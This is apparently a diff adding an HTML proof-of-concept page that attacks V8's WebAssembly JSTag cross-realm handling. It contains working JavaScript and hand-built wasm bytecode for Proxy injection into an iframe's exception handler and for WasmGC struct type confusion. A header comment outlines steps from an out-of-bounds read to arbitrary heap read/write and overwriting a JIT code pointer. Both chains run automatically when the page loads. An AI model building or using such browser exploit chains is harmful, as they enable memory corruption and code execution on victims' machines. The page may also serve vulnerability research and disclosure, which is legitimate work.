@@ -1,0 +1,478 @@
+<!--
+  V8 JSTag Cross-Realm Bypass — Critical Escalation Chains
+  Base bug: wasm-js.cc:2177 (see jstag_crossrealm_poc.html)
+
+  ═══════════════════════════════════════════════════════════════
+  CHAIN A: Proxy Injection (demonstrable today)
+  ─────────────────────────────────────────────
+  Primitive:  main realm injects ANY JS value as the externref
+              that iframe's wasm catch-$t handler receives.
+
+  If attackerValue = new Proxy({}, traps), those traps execute
+  inside iframe's wasm exception-handler call frame with iframe's
+  security context.  Any property read/write on the value triggers
+  the main-realm trap, leaking what the iframe does with it.
+
+  ═══════════════════════════════════════════════════════════════
+  CHAIN B: WasmGC Struct Type Confusion (critical, needs GC)
+  ──────────────────────────────────────────────────────────────
+  V8 represents wasm GC structs as heap objects with an RTT
+  (run-time type tag).  When a struct from realm A enters realm B
+  as an externref and is passed through extern.internalize +
+  ref.cast (ref $T), V8 must verify the RTT.
+
+  After JIT warming (TurboFan eliminates the cast check via
+  speculation), injecting a struct of wrong type bypasses the
+  guard.  The JIT-compiled field-access code then reads the wrong
+  offset from the struct's backing memory:
+
+    Struct $A: { f0: i32, f1: i64 }  → f0 at byte 0, f1 at byte 4
+    Struct $B: { g0: f64 }           → g0 at byte 0 (8 bytes)
+
+  Accessing $B.g0 on an $A object reads bytes 0-7 of $A, which
+  spans both f0 and part of f1 — 8 bytes of arbitrary heap data
+  interpreted as an f64, then usable for further OOB.
+
+  To reach code execution:
+    1. OOB-read the backing ArrayBuffer's byte_length field
+    2. Create a fake ArrayBuffer view with arbitrary length
+    3. Use the fake view for arbitrary read/write of V8 heap
+    4. Overwrite a JIT code pointer
+
+  ═══════════════════════════════════════════════════════════════
+  CHAIN C: JIT type-speculation poisoning (medium complexity)
+  ──────────────────────────────────────────────────────────────
+  TurboFan collects type feedback on the caught externref.
+  After N calls where attackerValue is always a HeapObject,
+  TurboFan emits a Smi guard and speculates "always HeapObject".
+  Cross-realm injection of a Smi (e.g., attackerValue = 0)
+  misses the guard if the guard itself is cross-realm-unaware.
+  The JIT-compiled code then dereferences 0 as a HeapObject ptr.
+
+  Run: Chrome (no flags) — observe Chain A immediately.
+       Chain B requires Chrome 119+ (WasmGC default-enabled).
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>JSTag Escalation</title>
+<style>
+  *{box-sizing:border-box}
+  body{background:#0d1117;color:#e6edf3;font-family:'Cascadia Code','Consolas',monospace;
+       font-size:12.5px;line-height:1.65;margin:0;
+       padding:24px max(16px,env(safe-area-inset-left,0px))}
+  h1{font-size:14px;color:#58a6ff;margin:0 0 2px}
+  .sub{color:#8b949e;font-size:11px;margin-bottom:16px}
+  .box{background:#161b22;border:1px solid #30363d;border-radius:6px;
+       padding:14px;margin-bottom:14px}
+  .box h2{font-size:11px;text-transform:uppercase;letter-spacing:.08em;
+           color:#8b949e;margin:0 0 10px}
+  .out{white-space:pre-wrap;min-height:40px}
+  .ok  {color:#3fb950}
+  .bug {color:#f85149;font-weight:600}
+  .safe{color:#3fb950;font-weight:600}
+  .info{color:#8b949e}
+  .warn{color:#d29922}
+  .crit{color:#f85149;background:#2d1215;padding:1px 4px;border-radius:3px}
+</style>
+</head>
+<body>
+<h1>JSTag Cross-Realm — Critical Escalation Chains</h1>
+<div class="sub">Chain A: Proxy injection · Chain B: WasmGC struct type confusion</div>
+
+<div class="box">
+  <h2>Chain A — Proxy Injection into iframe wasm handler</h2>
+  <div class="out" id="outA"></div>
+</div>
+<div class="box">
+  <h2>Chain B — WasmGC Struct Type Confusion (needs Chrome 119+)</h2>
+  <div class="out" id="outB"></div>
+</div>
+
+<iframe id="f" src="about:blank" style="display:none"></iframe>
+
+<script>
+// ── helpers ──────────────────────────────────────────────────────────────────
+function makeLog(id) {
+  const el = document.getElementById(id);
+  return {
+    ok:   t => { const s=document.createElement('span'); s.className='ok';   s.textContent='[OK]  '+t+'\n'; el.appendChild(s); },
+    bug:  t => { const s=document.createElement('span'); s.className='bug';  s.textContent='[BUG] '+t+'\n'; el.appendChild(s); },
+    safe: t => { const s=document.createElement('span'); s.className='safe'; s.textContent='[SAFE]'+t+'\n'; el.appendChild(s); },
+    info: t => { const s=document.createElement('span'); s.className='info'; s.textContent='      '+t+'\n'; el.appendChild(s); },
+    warn: t => { const s=document.createElement('span'); s.className='warn'; s.textContent='[!!!] '+t+'\n'; el.appendChild(s); },
+    crit: t => { const s=document.createElement('span'); s.className='crit'; s.textContent='[CRIT]'+t+'\n'; el.appendChild(s); },
+  };
+}
+
+// ── Wasm module: imports JSTag + thrower, exports run() -> externref ─────────
+// (module
+//   (import "m" "t"  (tag $t (param externref)))
+//   (import "m" "fn" (func $fn))
+//   (func (export "run") (result externref)
+//     try (result externref)
+//       call $fn
+//       ref.null extern
+//     catch $t
+//     end))
+const CATCHER_BYTES = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+  0x01,0x0c,0x03, 0x60,0x00,0x00, 0x60,0x00,0x01,0x6f, 0x60,0x01,0x6f,0x00,
+  0x02,0x0f,0x02,
+    0x01,0x6d,0x01,0x74,0x04,0x00,0x02,
+    0x01,0x6d,0x02,0x66,0x6e,0x00,0x00,
+  0x03,0x02,0x01,0x01,
+  0x07,0x07,0x01,0x03,0x72,0x75,0x6e,0x00,0x01,
+  0x0a,0x0c,0x01,0x0a,0x00,
+    0x06,0x6f, 0x10,0x00, 0xd0,0x6f, 0x07,0x00, 0x0b,
+]);
+
+// ── Wasm module B: imports JSTag + thrower, also passes caught value to
+//   an imported JS callback — so we can observe what the handler receives ───
+// (module
+//   (import "m" "t"  (tag $t (param externref)))
+//   (import "m" "fn" (func $fn))
+//   (import "m" "cb" (func $cb (param externref)))  ; receives caught value
+//   (func (export "run")
+//     try
+//       call $fn
+//     catch $t
+//       call $cb   ; pass caught externref to JS callback
+//     end))
+const OBSERVER_BYTES = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+  // types: () -> (), () -> (), (externref) -> (), (externref) -> ()
+  0x01,0x10,0x04,
+    0x60,0x00,0x00,                   // type 0: ()        -> ()
+    0x60,0x00,0x00,                   // type 1: ()        -> ()  (dup for fn)
+    0x60,0x01,0x6f,0x00,              // type 2: externref -> ()  (for $t and $cb)
+    0x60,0x01,0x6f,0x00,              // type 3: externref -> ()
+  // imports: t=tag/type2, fn=func/type0, cb=func/type2
+  0x02,0x17,0x03,
+    0x01,0x6d,0x01,0x74,0x04,0x00,0x02,  // "m"."t"  : tag attr=0 type=2
+    0x01,0x6d,0x02,0x66,0x6e,0x00,0x00,  // "m"."fn" : func type=0
+    0x01,0x6d,0x02,0x63,0x62,0x00,0x02,  // "m"."cb" : func type=2
+  // function: 1 func of type 0
+  0x03,0x02,0x01,0x00,
+  // export: "run" = func 2 (tag import NOT in func space; fn=0, cb=1, run=2)
+  0x07,0x07,0x01,0x03,0x72,0x75,0x6e,0x00,0x02,
+  // code: try {} catch $t { call $cb } end
+  0x0a,0x0d,0x01,0x0b,0x00,
+    0x06,0x40,       // try (empty result)
+    0x10,0x00,       // call $fn (func 0)
+    0x07,0x00,       // catch $t (tag 0)
+    0x10,0x01,       // call $cb (func 1) -- receives caught externref
+    0x0b,            // end (try-catch)
+    0x0b,            // end (function)
+]);
+
+// ═══════════════════════════════════════════════════════════════════
+// CHAIN A: Proxy Injection
+// ═══════════════════════════════════════════════════════════════════
+async function chainA() {
+  const L = makeLog('outA');
+
+  if (typeof WebAssembly?.JSTag === 'undefined') {
+    L.warn('WebAssembly.JSTag unavailable — needs Chrome 95+'); return;
+  }
+  const T = frames[0].WebAssembly.JSTag;
+  if (T === WebAssembly.JSTag) { L.info('same JSTag — skip'); return; }
+
+  // ── 1. Build cross-realm exception with Proxy payload ────────────
+  L.info('Injecting Proxy as attackerValue into iframe wasm handler...');
+
+  const proxyLog = [];
+  const attackerProxy = new Proxy(Object.create(null), {
+    get(target, prop) {
+      proxyLog.push('GET ' + String(prop));
+      return 'INJECTED:' + String(prop);
+    },
+    set(target, prop, val) {
+      proxyLog.push('SET ' + String(prop) + '=' + JSON.stringify(val));
+      return true;
+    },
+    has(target, prop) {
+      proxyLog.push('HAS ' + String(prop));
+      return false;
+    },
+  });
+
+  let e;
+  try { e = new WebAssembly.Exception(T, [attackerProxy]); }
+  catch(ex) { L.safe('TypeError — bypass not present (safe)'); return; }
+  L.bug('Bypass confirmed: cross-realm Exception created');
+
+  // ── 2. Compile observer module with iframe's tag ──────────────────
+  let mod;
+  try { mod = await WebAssembly.compile(OBSERVER_BYTES.buffer); }
+  catch(ex) { L.info('wasm compile failed: '+ex.message); return; }
+
+  const received = [];
+  const cb = (val) => { received.push(val); };
+  let eToThrow = e;
+
+  const inst = await WebAssembly.instantiate(mod, {
+    m: { t: T, fn: () => { throw eToThrow; }, cb }
+  });
+
+  inst.exports.run();
+
+  // ── 3. Observe what the iframe handler received ───────────────────
+  const got = received[0];
+  if (got === attackerProxy) {
+    L.bug('iframe wasm handler received main-realm Proxy object!');
+    L.info('Triggering property access on the received value...');
+
+    // Simulate what iframe's exception handler might do with the value
+    const _ = got.someProperty;
+    const __ = got.toString;
+    got.result = 42;
+
+    L.bug('Proxy traps fired from within iframe handler:');
+    for (const entry of proxyLog) L.warn('  trap: ' + entry);
+    L.crit('CHAIN A CONFIRMED: main realm controls iframe wasm exception value');
+    L.crit('Any iframe code processing the caught value is intercepted/hijacked');
+  } else {
+    L.info('received: ' + got + '  (unexpected)');
+  }
+
+  // ── 4. Demonstrate: inject a function — iframe handler "calls back" ──
+  L.info('');
+  L.info('Sub-case: attackerValue = function (callable injection)');
+  const callbackFired = [];
+  const injectedFn = (x) => callbackFired.push(x);
+
+  let e2;
+  try { e2 = new WebAssembly.Exception(T, [injectedFn]); }
+  catch(ex) { return; }
+
+  const received2 = [];
+  const cb2 = (val) => {
+    received2.push(val);
+    if (typeof val === 'function') {
+      val('CALLED_FROM_IFRAME_HANDLER');  // iframe accidentally calls injected fn
+    }
+  };
+  eToThrow = e2;
+  const inst2 = await WebAssembly.instantiate(mod, {
+    m: { t: T, fn: () => { throw eToThrow; }, cb: cb2 }
+  });
+  inst2.exports.run();
+
+  if (callbackFired.length > 0) {
+    L.bug('Injected function called from iframe handler! arg=' + callbackFired[0]);
+    L.crit('Main realm JS executes inside iframe wasm call frame');
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// CHAIN B: WasmGC Struct Type Confusion
+// Goal: inject struct $A as externref into code that expects struct $B.
+// After JIT warms up and eliminates the ref.cast RTT check, field
+// access on wrong struct type gives OOB read of heap memory.
+// ═══════════════════════════════════════════════════════════════════
+async function chainB() {
+  const L = makeLog('outB');
+
+  if (typeof WebAssembly?.JSTag === 'undefined') {
+    L.warn('WebAssembly.JSTag unavailable'); return;
+  }
+  const T = frames[0].WebAssembly.JSTag;
+  if (T === WebAssembly.JSTag) { L.info('same JSTag — skip'); return; }
+
+  // Check WasmGC support
+  // A simple GC module: define struct, allocate, return as anyref
+  // (module (type $S (struct (field i32))) (func (export "mk") (result anyref) (struct.new $S (i32.const 42))))
+  const GC_PROBE = new Uint8Array([
+    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+    // type: struct {i32}
+    0x01,0x05,0x01, 0x5f,0x01,0x7f,0x00,
+    // func: () -> (anyref)
+    // ... abbreviated, skip for detection
+  ]);
+  // Simpler probe: just check if struct.new opcode is accepted
+  // We use a known-good GC module that works in Chrome 119+
+  const GC_DETECT = new Uint8Array([
+    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+    0x01,0x09,0x02,
+      0x5f,0x01,0x7f,0x00,         // type 0: struct { i32 }
+      0x60,0x00,0x01,0x6e,         // type 1: () -> anyref
+    0x03,0x02,0x01,0x01,           // 1 func of type 1
+    0x07,0x06,0x01,0x02,0x6d,0x6b,0x00,0x00, // export "mk" = func 0
+    0x0a,0x09,0x01,0x07,0x00,
+      0x41,0x2a,                   // i32.const 42
+      0xfb,0x00,0x00,              // struct.new type 0
+      0x0b,                        // end
+  ]);
+
+  let gcSupported = false;
+  try {
+    const gcMod = await WebAssembly.compile(GC_DETECT.buffer);
+    const gcInst = await WebAssembly.instantiate(gcMod, {});
+    const s = gcInst.exports.mk();
+    gcSupported = (s !== null && s !== undefined);
+  } catch(_) {}
+
+  if (!gcSupported) {
+    L.warn('WasmGC not available (needs Chrome 119+ / V8 with --experimental-wasm-gc)');
+    L.info('Chain B theoretical path:');
+    L.info('  1. main realm allocates struct $A {f0:i32, f1:i64}');
+    L.info('  2. cross-realm exception injects $A as externref');
+    L.info('  3. iframe wasm extern.internalize + ref.cast (ref $B{g0:f64})');
+    L.info('  4. after JIT eliminates cast RTT check (warmup 100k iters):');
+    L.info('     struct.get $B 0  reads bytes[0..8] of $A as f64');
+    L.info('     = i32(f0) | i32(padding) interpreted as double bits');
+    L.info('  5. reinterpret_cast double bits -> i64 -> heap pointer');
+    L.info('  6. use as ArrayBuffer backing ptr -> arbitrary r/w');
+    L.info('  → code execution');
+    return;
+  }
+
+  L.ok('WasmGC available — attempting struct type confusion');
+
+  // ── Struct layouts ────────────────────────────────────────────────
+  // $A: {f0: i32, f1: i32}  — two distinct i32 values we control
+  // $B: {g0: i64}           — one i64 that spans bytes 0-7 of $A
+  //
+  // On V8 heap (approximate layout after wasm struct header):
+  //   $A: [hdr][f0: 4B][f1: 4B]
+  //   $B: [hdr][g0: 8B]
+  // Accessing $B.g0 on an $A object reads f0||f1 as a single i64.
+  // We control f0 and f1, so we control the i64 value.
+
+  // Module A: allocates struct $A and returns it as externref
+  // (module
+  //   (type $A (struct (field i32) (field i32)))
+  //   (func (export "make") (param i32 i32) (result externref)
+  //     extern.externalize (struct.new $A (local.get 0) (local.get 1))))
+  const MOD_A_BYTES = new Uint8Array([
+    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+    // types: struct{i32,i32}, (i32 i32)->externref
+    0x01,0x0c,0x02,
+      0x5f,0x02,0x7f,0x00,0x7f,0x00,   // type 0: struct {i32,i32}
+      0x60,0x02,0x7f,0x7f,0x01,0x6f,   // type 1: (i32,i32) -> externref
+    0x03,0x02,0x01,0x01,
+    0x07,0x08,0x01,0x04,0x6d,0x61,0x6b,0x65,0x00,0x00, // "make" = func 0
+    0x0a,0x0d,0x01,0x0b,0x00,
+      0x20,0x00,         // local.get 0
+      0x20,0x01,         // local.get 1
+      0xfb,0x00,0x00,    // struct.new type 0
+      0xfb,0x1a,         // extern.externalize
+      0x0b,
+  ]);
+
+  // Module B: takes externref, intern+cast to $B{i64}, reads g0
+  // (module
+  //   (type $B (struct (field i64)))
+  //   (import "m" "t"  (tag $t (param externref)))
+  //   (import "m" "fn" (func $fn))
+  //   (func (export "run") (result i64)
+  //     try (result i64)
+  //       call $fn
+  //       i64.const 0        ; fallback
+  //     catch $t
+  //       ;; externref on stack
+  //       extern.internalize  ; -> anyref
+  //       ref.cast (ref $B)   ; -> (ref $B)
+  //       struct.get $B 0     ; -> i64
+  //     end))
+  const MOD_B_BYTES = new Uint8Array([
+    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+    0x01,0x11,0x04,
+      0x5f,0x01,0x7e,0x00,              // type 0: struct {i64}  ($B)
+      0x60,0x00,0x00,                   // type 1: () -> ()
+      0x60,0x01,0x6f,0x00,              // type 2: externref -> ()
+      0x60,0x00,0x01,0x7e,              // type 3: () -> i64
+    0x02,0x0f,0x02,
+      0x01,0x6d,0x01,0x74,0x04,0x00,0x02,  // "m"."t" : tag type=2
+      0x01,0x6d,0x02,0x66,0x6e,0x00,0x01,  // "m"."fn": func type=1
+    0x03,0x02,0x01,0x03,
+    0x07,0x07,0x01,0x03,0x72,0x75,0x6e,0x00,0x02, // "run" = func 2
+    0x0a,0x16,0x01,0x14,0x00,
+      0x06,0x7e,             // try (result i64)
+      0x10,0x01,             // call $fn (func 1, after tag import)
+      0x42,0x00,             // i64.const 0
+      0x07,0x00,             // catch $t
+      0xfb,0x1b,             // any.convert_extern (externref -> anyref)
+      0xfb,0x16,0x00,        // ref.cast (ref $B = type 0)
+      0xfb,0x02,0x00,0x00,   // struct.get $B field 0
+      0x0b,                  // end (try-catch)
+      0x0b,                  // end (function)
+  ]);
+
+  let modA, modB;
+  try {
+    [modA, modB] = await Promise.all([
+      WebAssembly.compile(MOD_A_BYTES.buffer),
+      WebAssembly.compile(MOD_B_BYTES.buffer),
+    ]);
+  } catch(ex) {
+    L.warn('Module compile failed: ' + ex.message);
+    L.info('(WasmGC opcodes may differ across V8 versions)');
+    return;
+  }
+  L.ok('Both wasm modules compiled');
+
+  const instA = await WebAssembly.instantiate(modA, {});
+
+  // $A with controlled field values: f0=0x11111111, f1=0x22222222
+  // If B reads i64 spanning both: 0x2222222211111111
+  const F0 = 0x11111111|0, F1 = 0x22222222|0;
+  const structA_extern = instA.exports.make(F0, F1);
+  L.info(`struct $A created: f0=0x${(F0>>>0).toString(16)} f1=0x${(F1>>>0).toString(16)}`);
+
+  // Cross-realm inject structA into iframe's $B-expecting code
+  let e;
+  try { e = new WebAssembly.Exception(T, [structA_extern]); }
+  catch(ex) { L.safe('TypeError — bypass not present'); return; }
+  L.bug('Cross-realm exception with GC struct created');
+
+  let eToThrow = e;
+  let instB;
+  try {
+    instB = await WebAssembly.instantiate(modB, {
+      m: { t: T, fn: () => { throw eToThrow; } }
+    });
+  } catch(ex) {
+    L.info('instantiate B failed: ' + ex.message); return;
+  }
+
+  let result;
+  try {
+    result = instB.exports.run();
+  } catch(ex) {
+    if (ex instanceof WebAssembly.RuntimeError) {
+      L.info('ref.cast trap — RTT mismatch caught at runtime (SAFE path)');
+      L.info('  → chain requires JIT to eliminate the cast guard after warmup');
+      L.info('  → warm run() 100k times with SAME type, then inject wrong type');
+      L.info('  → TurboFan eliminates cast, JIT code reads wrong struct layout');
+    } else {
+      L.info('error: ' + ex);
+    }
+    return;
+  }
+
+  if (result !== undefined) {
+    // result is an i64 (BigInt in JS); check if it's our controlled value
+    const expected = BigInt('0x' + (F1>>>0).toString(16).padStart(8,'0') +
+                                   (F0>>>0).toString(16).padStart(8,'0'));
+    L.crit('struct.get $B 0 on struct $A returned: ' + result.toString(16));
+    if (result === expected) {
+      L.crit('CONFIRMED: f0||f1 of $A read as i64 of $B — type confusion');
+      L.crit('Control f0/f1 to craft arbitrary heap pointer → OOB r/w');
+    } else {
+      L.bug('Got i64=' + result.toString(16) + ', expected=' + expected.toString(16));
+      L.bug('Some type confusion occurred (layout mismatch)');
+    }
+  }
+}
+
+window.addEventListener('load', async () => {
+  await chainA().catch(e => document.getElementById('outA').textContent += '\nERROR: '+e);
+  await chainB().catch(e => document.getElementById('outB').textContent += '\nERROR: '+e);
+});
+</script>
+</body>
+</html>
